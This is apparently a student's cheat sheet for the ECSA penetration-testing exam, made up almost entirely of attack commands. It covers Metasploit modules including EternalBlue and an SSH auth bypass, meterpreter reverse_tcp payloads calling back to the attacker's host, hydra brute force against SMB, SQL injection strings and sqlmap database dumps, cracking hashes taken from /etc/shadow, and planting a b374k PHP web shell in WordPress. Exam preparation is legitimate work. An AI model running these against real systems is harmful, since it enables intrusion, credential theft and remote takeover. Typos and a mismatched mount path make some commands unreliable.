# ECSA-Test Exam

#FTP

metasploit auxiliary/scanner/ftp/anonymous

or 

nmap -p 21 --script ftp-anon 172.19.19.8 

#RPC #NFS
Searching for miscofigured RPC services and NFS
namp -T4 -A 172.20.20.0/24

used also auxiliary/scanner/nfs/nfsmount

Below would display rpc services: 
rpcinfo -p 172.20.20.14 

showmount --export 172.20.20.14

Mounting resource:
sudo mkdir /var/backups
sudo mount -t nfs 172.10.10.14:/backups /root/backups


#SNMP 

use auxiliary/scanner/snmp/snmp_login

When users identified used for #SMB:

hydra -L fileWithUsers.txt -P fileWIthPasswords.txt 172.222.22.22 smb

after that use psexec in measploit


#SSH
use exploit/windows/ssh/freesshd_authbypass for WebOnlyDO

background it

i set session 1
ii. set payload windows/meterpreter/reverse_tcp
iii. set lhost 172.19.19.7

on windows metasploit exploit ms14_058_track_popup_menu


# SQL injection

blah' or 1=1 -- 
blah';insert into login values ('user','user123'); --
blah';create database somedatabase; --

sqlmap -u "www.somesite.com" --method POST --data "data from the injection test" --dbs
                                                                                -D dtabasename --tables

                                                                                -D hotel -T tablename --dump

                                                                                
 #Windows #eternalblue                                                                  In case of use auxiliary/scanner/smb/smb_ms17_010

use exploit/windows/smb/eternalblue_doublepulsar

set rhost target_IP
set processinject lsass.exe
set targetarchitecture x64
set payload windows/x64/meterpreter/reverse_tcp
set lhost localipaddress - of attacker

adjust architecture and inject process if needed



## Local attack machine to receive connection

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp


## John the Riper usage
export CPUID_DISABLE=1
john --format=nt /root/Desktop/hashes.txt - if hashes are dumped from the OS 



## passwords from Linux

unshadow password.txt shadow.txt > unshadow
files are from /etc/shadow and /etc/passwd

after 
export CPUID_DISABLE=1
john unshadow


## Wordpress 

wpscan --url http://ip_address/wordpress --enumerate p

Possible replacement of 404 page with b374k-master - tool would generate shell.php like this

php -f index.php -- -o shell.php -s -b -z gzcompress -c 9

For wordpress possible exploit/unix/webapp/wp_admin_shell_upload 

